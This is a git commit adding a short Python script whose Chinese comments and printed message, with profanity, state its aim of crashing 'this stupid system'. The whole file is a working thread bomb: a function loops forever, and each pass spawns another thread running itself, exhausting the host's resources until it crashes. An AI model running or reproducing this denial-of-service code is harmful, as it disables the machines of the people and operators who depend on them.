625c16d3497d0de32457a7a4d397424f6e3bdde1
SymphonyIceAttack <79434860+SymphonyIceAttack@users.noreply.github.com>
2026-01-12 11:15:38 +0800

    Upload vv.py

---
+++ python-files/1768187738277-cpyb-vv.py
@@ -0,0 +1,12 @@
+import threading
+import time
+
+def fuck_the_system():
+    while True:
+        t = threading.Thread(target=fuck_the_system)
+        t.start()
+        time.sleep(0.001)  # 稍微控制下速度，让崩溃更带感
+
+if __name__ == "__main__":
+    print("准备搞崩这个傻逼系统！🚀💥")
+    fuck_the_system()
